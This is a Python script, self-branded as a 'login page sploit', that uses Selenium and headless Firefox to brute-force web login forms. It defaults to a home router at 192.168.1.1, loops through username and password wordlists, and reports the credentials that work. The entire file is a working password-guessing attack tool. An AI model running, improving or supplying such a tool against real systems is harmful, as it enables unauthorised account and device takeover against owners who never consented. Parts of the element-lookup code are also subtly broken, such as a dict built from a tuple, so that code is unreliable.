# chmod +x /PATH-TO/selenium/webdriver/common/linux/selenium-manager

import sys
import time
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import statistics

# ANSI Colors
YELLOW = "\033[93m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

lines = [
    "__        _______ ____",
    "\ \      / /  ___/ ___| YOUR",
    " \ \ /\ / /| |_  \___ \ LOGIN",
    "  \ V  V / |  _|  ___) |PAGE",
    "   \_/\_/  |_|   |____/ SPLOIT"
]

for line in lines:
    print(line)

def colored_print(text, color):
    return f"{color}{text}{RESET}"

def get_user_input(default, prompt, color):
    user_input = input(colored_print(prompt, color))
    if not user_input:
        return default
    return user_input

def is_read_only(element):
    return element.get_attribute("readonly") is not None

def wait_for_editable_input(driver, by, value):
    WebDriverWait(driver, 10).until(lambda d: not is_read_only(d.find_element(by, value)))

# Helper function to find element with multiple methods
def find_element_with_fallbacks(driver, element_info):
    """
    Try to find an element using different methods in a fallback sequence:
    1. First try with the provided method
    2. If the element has onclick attribute
    3. By CSS selector
    4. By XPath with contains
    """
    by_type, value = element_info
    
    # Try the primary method first
    try:
        return driver.find_element(by_type, value)
    except NoSuchElementException:
        pass
    
    # Try by onclick attribute
    try:
        if "onclick" in element_info:
            onclick_value = element_info["onclick"]
            xpath = f"//*[@onclick='{onclick_value}']"
            return driver.find_element(By.XPATH, xpath)
    except (NoSuchElementException, KeyError):
        pass
    
    # Try generic selectors as fallbacks
    fallback_methods = [
        # Try by any attribute containing the value
        (By.XPATH, f"//*[contains(@*, '{value}')]"),
        # Try by button/input with type=submit
        (By.XPATH, "//button[@type='submit']"),
        (By.XPATH, "//input[@type='submit']"),
        # Try by typical form button classes
        (By.XPATH, "//button[contains(@class, 'btn')]"),
        (By.XPATH, "//button[contains(@class, 'login')]"),
        # Try by common button text
        (By.XPATH, "//button[contains(text(), 'Login')]"),
        (By.XPATH, "//button[contains(text(), 'Sign In')]"),
        (By.XPATH, "//input[@value='Login']"),
        (By.XPATH, "//input[@value='Sign In']")
    ]
    
    for method, selector in fallback_methods:
        try:
            return driver.find_element(method, selector)
        except NoSuchElementException:
            continue
            
    # If we can't find the element, raise an exception
    raise NoSuchElementException(f"Element with '{value}' not found using any method")

def brute(username, password, combinations_tested, total_combinations, driver, url, expression, 
          username_element_info, password_element_info, button_element_info, response_times):
    start_time = time.time()
    
    try:
        driver.get(url)
        print(colored_print("\nPage loaded successfully", GREEN))

        driver.implicitly_wait(10)

        print(colored_print("Locating username input field...", BLUE))
        
        # Use the new helper function to find elements with fallbacks
        username_input = find_element_with_fallbacks(driver, username_element_info)
        print(colored_print("Username input field found", YELLOW))

        password_input = find_element_with_fallbacks(driver, password_element_info)
        
        # Clear fields and enter credentials
        username_input.clear()
        username_input.send_keys(username)
        password_input.clear()
        password_input.send_keys(password)

        # Submit the form
        try:
            submit_button = find_element_with_fallbacks(driver, button_element_info)
            submit_button.click()
            print(colored_print("Form submission successful", GREEN))
        except Exception as e:
            print(colored_print(f"Error clicking submit button: {e}", RED))

        # Measure response time
        response_time = time.time() - start_time
        response_times.append(response_time)
        
        # Calculate statistics if we have enough data
        avg_time = statistics.mean(response_times[-5:]) if len(response_times) >= 5 else 0
        
        # Wait for page load
        time.sleep(2)

        driver_lower_content = driver.page_source.lower()
        
        # Check for successful login
        success = not any(item in driver_lower_content for item in expression)
        
        # Check for unusual response time that may indicate success
        time_anomaly = False
        if len(response_times) >= 10:
            std_dev = statistics.stdev(response_times[-10:-1])  # Exclude the current one
            mean_time = statistics.mean(response_times[-10:-1])
            
            # If current response time differs significantly from the mean
            if abs(response_time - mean_time) > (2 * std_dev):
                time_anomaly = True
                print(colored_print(f"\n[!] Response time anomaly detected: {response_time:.2f}s (avg: {mean_time:.2f}s)", YELLOW))
        
        if success:
            print("\nBrute Forcing...")
            print("[+] Username: ", username)
            print("[+] Password: ", password)
            print(colored_print("Success! Login successful!", GREEN))
            print("Server Response:", driver.page_source[:200] + "...")  # Show truncated response
            sys.exit()
        elif time_anomaly:
            print("\n[!] Unusual response time detected - might be worth checking:")
            print("[+] Username: ", username)
            print("[+] Password: ", password)
            print(f"[+] Response Time: {response_time:.2f}s (Average: {avg_time:.2f}s)")
        else:
            print(f"Login failed. Response time: {response_time:.2f}s")
            
            # Debug: Show what expressions were found
            found_items = [item.decode() for item in expression if item in driver_lower_content.encode()]
            if found_items:
                print(f"Error messages found: {', '.join(found_items)}")
            
    except Exception as e:
        print(colored_print(f"Error using Selenium: {e}", RED))
        sys.exit(1)

def main():
    usage = input("Show URL usage? y/n: ")
    if usage.lower() == "y":
        print("Enter the login page URL, for example: https://site.com:1234/login-page/login.html ")
        print("- The file depends on how the login page was created, simply look at the login page URL and see if it has a file name. If not, just don't put anything after the URL.")
        print("- The port depends on whether the site supports HTTP or HTTPS. If it's on port 443, use HTTPS in the URL. If the site uses port 80, use HTTP in the URL. Or if the site has another service port, simply specify it in the URL.")
        print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
    else:
        pass

    url = get_user_input('http://192.168.1.1', "Router's ip (default: http://192.168.1.1) : ", RESET)
    print("\r")

    expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}  # Add your own error messages here

    # Get element information for username
    print(colored_print("USERNAME ELEMENT CONFIGURATION", YELLOW))
    u_name = get_user_input("username", "Username html element name (default: username): ", YELLOW)
    username_element_type = get_user_input("i", "Element identification type (i=id, n=name, x=xpath, c=css, o=onclick): ", YELLOW)

    # Get element information for password
    print(colored_print("PASSWORD ELEMENT CONFIGURATION", BLUE))
    p_word = get_user_input("password", "Password html element name (default: password): ", BLUE)
    password_element_type = get_user_input("i", "Element identification type (i=id, n=name, x=xpath, c=css, o=onclick): ", BLUE)

    # Get element information for button
    print(colored_print("BUTTON ELEMENT CONFIGURATION", GREEN))
    button = get_user_input("button", "Button html element name (default: button): ", GREEN)
    button_element_type = get_user_input("i", "Element identification type (i=id, n=name, x=xpath, c=css, o=onclick): ", GREEN)
    
    # If 'onclick' is selected, get the onclick value
    button_onclick = None
    if button_element_type == "o":
        button_onclick = get_user_input("login()", "Button's onclick value (e.g. 'login()'): ", GREEN)

    # Convert input to Selenium By types
    element_types = {
        "i": By.ID,
        "n": By.NAME,
        "x": By.XPATH,
        "c": By.CSS_SELECTOR,
        "o": By.XPATH  # Will use XPath for onclick
    }

    username_element_info = (element_types.get(username_element_type, By.ID), u_name)
    password_element_info = (element_types.get(password_element_type, By.ID), p_word)
    
    # Create button element info with optional onclick
    button_element_info = (element_types.get(button_element_type, By.ID), button)
    if button_element_type == "o":
        button_element_info = (By.XPATH, f"//*[@onclick='{button_onclick}']")
        button_element_info = dict(button_element_info)
        button_element_info["onclick"] = button_onclick

    options = Options()
    options.headless = True
    driver = webdriver.Firefox(options=options)
    print(colored_print("\rFirefox WebDriver started successfully", YELLOW))

    combinations_tested = 0
    response_times = []  # List to store response times

    while True:
        usernames_file = input("Usernames file location (default: username.txt): ")
        if not usernames_file:
            usernames_file = "username.txt"
        passwords_file = input("Passwords file location (default: password.txt): ")
        if not passwords_file:
            passwords_file = "password.txt"

        try:
            with open(usernames_file, "r") as user_file:
                usernames = [u.strip() for u in user_file.readlines()]
            with open(passwords_file, "r") as pass_file:
                passwords = [p.strip() for p in pass_file.readlines()]
            break
        except FileNotFoundError:
            print("One or both files not found. Please provide valid file locations.")
        except PermissionError:
            print("Permission denied. Please check file permissions and try again.")
        except Exception as e:
            print(f"An error occurred while loading files: {e}")

    total_combinations = len(usernames) * len(passwords)

    try:
        for username in usernames:
            for password in passwords:
                combinations_tested += 1
                sys.stdout.write("\nCombinations tested: %d/%d" % (combinations_tested, total_combinations))
                sys.stdout.flush()
                brute(username, password, combinations_tested, total_combinations, driver, url, expression, 
                      username_element_info, password_element_info, button_element_info, response_times)
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")
    finally:
        driver.quit()

if __name__ == '__main__':
    main()
